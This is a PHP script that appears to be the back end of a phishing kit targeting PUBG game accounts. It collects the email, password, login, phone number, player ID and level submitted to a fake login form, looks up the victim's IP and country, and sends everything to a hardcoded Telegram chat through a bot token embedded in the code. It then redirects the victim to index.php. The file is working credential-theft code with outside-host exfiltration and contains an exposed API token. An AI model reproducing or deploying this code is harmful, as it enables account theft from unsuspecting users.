<?php
$min_seconds_between_refreshes = 3;
session_start();
if(array_key_exists("last_access", $_SESSION) && time()-$min_seconds_between_refreshes <= $_SESSION["last_access"]) 
  exit("<H1></H1>");

$_SESSION["last_access"] = time();
 ?>
<?php
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$time = date("Y-m-d H:i:s");
$level = $_POST['level'];
$phone = $_POST['phone'];
$playid = $_POST['playid'];
$username = $_POST['username'];
$API_KEY = '5467917483:AAHjaAtIfq7CZkCAwb45D1WGEU61oxDm8LI';//TOKIN
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $yhya = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$yhya";
        $yhyasyrian = file_get_contents($url);
        return json_decode($yhyasyrian);
    }
    function getUserIP()
    {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

$ip = getUserIP();
$jsondata = json_decode($cty1);
$cty = $jsondata->country_name ;
$jsondata = json_decode($cty2);
$cty2 = $jsondata-> getcalling_code;
$api = json_decode(file_get_contents("https://dlyar-dev.tk/api/whois.php?ip=".$ip));

$flag = $api->flag;
$ccode = $api->code;
$country = $api->country;;
$ip = $details->ip;
$year = date('Y');
$month = date('n');
$day = date('j');
$admin = "1759038075";//Id
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
𝒏𝒆𝒘 𝒂𝒄𝒄 𝒑𝒖𝒃𝒈   

✶𝑳𝐎𝐆𝐈𝐍🐈‍⬛» $login

✶𝔼𝕄𝔸𝕀𝕃🐼»`$email`

✶𝐏 𝐀 𝐒 𝐒 𝐖 𝐎 𝐑 𝐃🦍🦓» `$password`

✶𝐂𝐎𝐔𝐍𝐓𝐑𝐘🗺🖤» $country$flag

✶𝐂𝐎𝐔𝐍𝐓𝐑𝐘 𝐂𝐎𝐃𝐄🎩♟️» $ccode

✶𝐓𝐈𝐌𝐄🐧» $time

✶𝐃𝐀𝐓𝐄🖤🦅» $day/$month/$year

level: $level

id : $playid

phone : $phone
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
header('Location: index.php');